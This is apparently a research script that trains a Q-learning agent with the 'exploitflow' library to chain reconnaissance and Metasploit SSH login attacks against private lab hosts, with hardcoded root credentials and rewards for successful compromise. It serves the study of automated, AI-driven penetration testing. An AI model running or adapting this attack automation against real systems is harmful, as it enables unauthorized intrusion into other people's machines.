import math
import random
import sys
import exploitflow as ef
from wasabi import color

#################################
# NOTE on network state encoding:
#################################
# Experiment designed with the following constraints:
#
# - y = 255, number of IPs considered
#     - ports
#       - n = 424, number of ports per IP considered
#       - l = 1, (open/closed) number of elements of information per port
#     - exploits
#       - m = 12, number of exploits considered
#       - b = 1, (launched/not launched) number of elements of information per exploit
#     - s = 0, system information elements considered
#
# Which leads to # of elements while encoding the state:
#   y * [n*(n + l) + m*(m + b) + s] = 255 * [424*(424 + 1) + 12*(12 + 1) + 0] = 256 * 180,356 = 46,171,136
# this leads to a setup which is non-feasible computationally.
#
# Therefore, we need to reduce the number of elements considered.
# We will do so by reducing the number of ips considered. Given 6 unique IPs:
#
#   ["127.0.0.1", "192.168.2.10", "192.168.2.5", "192.168.2.6", "192.168.2.7", "192.168.2.8"]
#
# we have the following number of elements while encoding the state:
#   y * [n*(n + l) + m*(m + b) + s] = 6 * [424*(424 + 1) + 12*(12 + 1) + 0] = 6 * 180,356 = 1,082,136
#
# still too many elements. We will change the number of ip and ports considered.
# We will now use the following 7 unique IPs:
#   ["127.0.0.1", "192.168.2.10", "192.168.2.5", "192.168.2.6", "192.168.2.7", "192.168.2.8", "192.168.2.1"]
# and the following ports:
#   TARGET_PORTS_BASIC = list(range(21, 30))
#
# accordingly, we have the following number of elements while encoding the state:
#   y * [n*(n + l) + m*(m + b) + s] = 7 * [9*(9 + 1) + 12*(12 + 1) + 0] = 7 * 246 = 1,722
# if we add dynamically a new exploit, we have:
#   y * [n*(n + l) + m*(m + b) + s] = 7 * [9*(9 + 1) + 13*(13 + 1) + 0] = 7 * 272 = 1,904


flow = ef.Flow()

##################################
# with instances
##################################
from exploitflow.state import State_v4
State_default = State_v4

## new exploits, if needed
metasploit_2 = ef.adapter_msf_initializer.get_name("auxiliary", "scanner/ssh/ssh_login")
metasploit_2.name = "scanner/ssh/ssh_login @ 192.168.2.5"

## set options
ef.targets.target = "192.168.2.1"
ef.versions.target = "192.168.2.10"
msf_options = {
    "RHOSTS": "192.168.2.10",
    "USERNAME": "root",
    "PASSWORD": "easybot"
}        
ef.metasploit.set_options(msf_options)
ef.metasploit.target = "192.168.2.10"

msf_options = {
    "RHOSTS": "192.168.2.5",
    "USERNAME": "root",
    "PASSWORD": "easybot"
}
metasploit_2.set_options(msf_options)
metasploit_2.target = "192.168.2.5"

## set reward
ef.idle.reward = 0
ef.metasploit.reward = -100  # first time successful, will do "*(-1)" to get "+100"
metasploit_2.reward = -100   # first time successful, will do "*(-1)" to get "+100   
ef.versions.reward = -10
ef.targets.reward = -10

# # if needed
# ef.exploits_all_instances = ef.exploits_all_instances + [...]

# global variables used for the one-hot-encoded state
exploits = [ef.targets,     # reconnaissance, footprinting            
            ef.versions,    # reconnaissance, fingerprinting
            ef.idle,        # idle
            ef.metasploit,  # ssh exploit, 192.168.2.10
            metasploit_2,   # ssh exploit, 192.168.2.5
            ef.init, 
            ]
# exploits = [versions, idle, expl]
exploits_encoded = [exploit.name for exploit in exploits]


# set learning model
## actions: list of actions available in the environment
## epsilon: exploration factor
## alpha: learning rate
## gamma: discount factor
flow.set_learning_model(ef.QLearn(actions=exploits_encoded, alpha=0.1, gamma=0.9, epsilon=0.1))


def reset(exploits):
    for exploit in exploits:
        exploit.run = False  # set run to False, to reset their capabilities

def soft_reset(exploits):
    for exploit in exploits:
        exploit.soft_reset = True
        exploit.run = False  # set run to False, to reset their capabilities

# train
rollouts = 1000
episode = 10
age = 1
debug = False
last_10_actions = []
while age <= rollouts:
    
    # observe the reward and update the model
    if flow.last_state():
        flow._graph.learning_model.learn(
            tuple(flow.last_state().one_hot_encode()), 
            flow.last_action().name, 
            flow.last_reward(), 
            tuple(flow.state().one_hot_encode()),
            debug=False)
        
    # choose an action
    if flow.state():
        action = flow._graph.learning_model.chooseAction(tuple(flow.state().one_hot_encode()))
    else:
        # use init
        action = ef.init.name  # always start with init

    last_10_actions.append(action)
    # fetch the action object from its "exploits_encoded" name
    action_expl = [exploit for exploit in exploits if exploit.name == action][0]

    # execute that action
    if flow.state():
        flow.run(flow.state() * action_expl, debug=debug)
    else:
        flow.run(action_expl, debug=debug)
    
    if age % 10 == 0:        

        # debug
        age_str = "Age: " + color("{:d}".format(age), fg="white", bg="blue", bold=True)
        epsilon_str = ", epsilon: {:0.2f}".format(flow._graph.learning_model.epsilon)
        reward_str = ", reward: " + color("{:0.2f}".format(flow.reward()), fg="white", bg="red", bold=True)        
        bytes = sys.getsizeof(flow._graph.learning_model.q)
        q_size_str = ", Q-size bytes: {:d} ".format(bytes)
        q_size_str += color("({:.2f} KB, {:d} elements)".format(bytes/1024, len(flow._graph.learning_model.q.keys())), 
                            fg="white", bg="blue", bold=True)
        print_message = age_str + epsilon_str + reward_str + q_size_str
    
        # last_actions_str = " -- last 10 actions: " + ", " + color([str(n) for n in last_10_actions[-10:]], fg="black", bg="white")
        # last_10_actions = []        
        # print_message += last_actions_str
        print(print_message)

    if age == rollouts:
        print(flow)

    if age % episode == 0:        
        # print(flow)
        # reset the flow
        flow.reset()  #Â reward=0, state=None, last_state=None, last_action=None, last_reward=None
        # reset(exploits)  # reset status of exploits
        soft_reset([ef.metasploit])

    # next rollout
    age += 1

# try things out, reset the flow and the exploits:
flow = ef.Flow()
reset(exploits)
# initialize flow
state = flow.run(ef.init)
actions = []
for i in range(9):  # let the model pick 9 actions
    action = flow._graph.learning_model.chooseAction(tuple(flow.state().one_hot_encode()))
    actions.append(action)
    action_expl = [exploit for exploit in exploits if exploit.name == action][0]
    flow.run(flow.state() * action_expl)

print(flow)
print(actions)
